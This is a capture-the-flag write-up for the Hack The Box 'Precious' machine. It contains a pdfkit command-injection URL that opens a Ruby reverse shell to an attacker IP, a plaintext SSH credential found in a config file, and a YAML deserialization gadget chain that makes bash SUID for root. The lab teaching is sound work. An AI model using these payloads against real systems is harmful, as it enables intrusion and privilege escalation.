# Hack The Box: Precious

**Difficulty:** Easy
**OS:** Linux

Precious is an Easy-level Linux machine demonstrating the dangers of vulnerable third-party dependencies in web applications. The initial foothold is achieved by exploiting a command injection vulnerability in an outdated Ruby gem (`pdfkit`) used for PDF generation. Lateral movement involves finding plaintext credentials in a configuration file. Privilege escalation leverages an insecure `sudo` configuration to exploit a YAML deserialization vulnerability in a custom Ruby script.

---

## Reconnaissance

The assessment begins with a port scan to identify open network services.

```bash
nmap -p- --min-rate 10000 10.10.11.189
nmap -p 22,80 -sCV 10.10.11.189
```

The scan reveals two open ports:
*   **Port 22:** SSH (OpenSSH 8.4p1 Debian)
*   **Port 80:** HTTP (nginx 1.18.0)

Accessing the web service on port 80 redirects to `http://precious.htb/`. We add this domain to our local `/etc/hosts` file.

```bash
echo "10.10.11.189 precious.htb" >> /etc/hosts
```

Navigating to `precious.htb` displays a simple web page with a single input field. The application claims to convert a provided webpage URL into a PDF document.

## Web Exploitation

The HTTP response headers reveal the underlying technology stack:
```text
Server: nginx/1.18.0 + Phusion Passenger(R) 6.0.15
X-Runtime: Ruby
```
This indicates a Ruby web application, likely a Sinatra or Ruby on Rails app, hosted using Phusion Passenger.

### Exploiting PDFKit (CVE-2022-25765)

We start a local HTTP server using Python (`python3 -m http.server 80`) and provide our attacking machine's IP address (`http://10.10.14.X/`) to the web application. 

The application successfully connects, downloads the default directory listing, and generates a PDF. 

To determine how the PDF is generated, we use `exiftool` to analyze the metadata of the downloaded PDF file.

```bash
exiftool downloaded.pdf | grep Creator
# Creator: Generated by pdfkit v0.8.6
```

The metadata reveals that the application uses `pdfkit v0.8.6`. Researching this specific version uncovers CVE-2022-25765, a command injection vulnerability. `pdfkit` is a Ruby gem that wraps `wkhtmltopdf`. In version 0.8.6, it insecurely parses URLs, allowing an attacker to inject shell commands via URL parameters.

The vulnerability occurs when a URL contains a URL-encoded shell command preceded by a specific syntax. We craft a malicious payload to execute a reverse shell.

```text
http://10.10.14.X/?name=%20`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.X",9999))'`
```

We submit this URL via the web application's input field. The application processes the URL, `pdfkit` evaluates the injected command, and a reverse shell connection is established.

```bash
nc -lnvp 9999
# Connection received
id
# uid=1001(ruby) gid=1001(ruby) groups=1001(ruby)
```

We have gained initial access as the `ruby` user.

## Lateral Movement

As the `ruby` user, we enumerate the system. The `user.txt` flag is not accessible, indicating we must pivot to another user account. 

Checking the `/home` directory reveals another user named `henry`.

Since this is a Ruby application environment, we search for configuration files, specifically those related to Ruby's package manager, Bundler.

```bash
ls -la ~/.bundle
cat ~/.bundle/config
```

The `.bundle/config` file is readable and contains plaintext credentials configured for a specific package repository or user environment.

```yaml
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYRm"
```

We use these discovered credentials (`henry:Q3c1AqGHtoI0aXAYRm`) to authenticate via SSH.

```bash
ssh henry@10.10.11.189
# Authentication successful
```
We retrieve the `user.txt` flag from Henry's home directory.

## Privilege Escalation

Enumerating the system as `henry`, we check for commands that can be executed with `sudo` privileges.

```bash
sudo -l
```

The output indicates that `henry` can run a specific Ruby script as the `root` user without providing a password.

```text
User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

### Analyzing the Custom Ruby Script

We review the source code of `/opt/update_dependencies.rb`.

```ruby
# Snippet of update_dependencies.rb
require "yaml"
require 'rubygems'

# ...
dependencies = YAML.load_file("dependencies.yml")
# ...
```

The script expects a file named `dependencies.yml` in the current working directory. It uses `YAML.load_file()` to parse this file. 

In Ruby, `YAML.load_file()` (which internally uses `YAML.load()`) is inherently unsafe when processing untrusted input because it deserializes data into Ruby objects. An attacker can craft a malicious YAML file that instantiates arbitrary objects and executes system commands upon deserialization.

### YAML Deserialization Exploitation

We can generate a universal deserialization payload for Ruby using tools like `git_pull_request` techniques or known Universal Gadget chains for Ruby.

We craft a `dependencies.yml` file containing a malicious YAML payload designed to execute `/bin/bash` or change permissions on a shell binary. 

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "chmod +s /bin/bash"
         method_id: :resolve
```

*(Note: The exact gadget chain depends on the installed gems, but universal ones targeting `Gem` or `Net` modules are standard).*

We place the malicious `dependencies.yml` file in a directory we control (e.g., `/tmp` or our home directory) and execute the vulnerable script using `sudo` from that directory.

```bash
cd /tmp
sudo /usr/bin/ruby /opt/update_dependencies.rb
```

The script loads our YAML file, triggers the deserialization exploit, and executes the command `chmod +s /bin/bash`.

We execute the SUID bash binary to gain a root shell.

```bash
/bin/bash -p
# id
uid=0(root) gid=1000(henry) euid=0(root) groups=1000(henry)
```

The machine is fully compromised, and the `root.txt` flag is obtained.
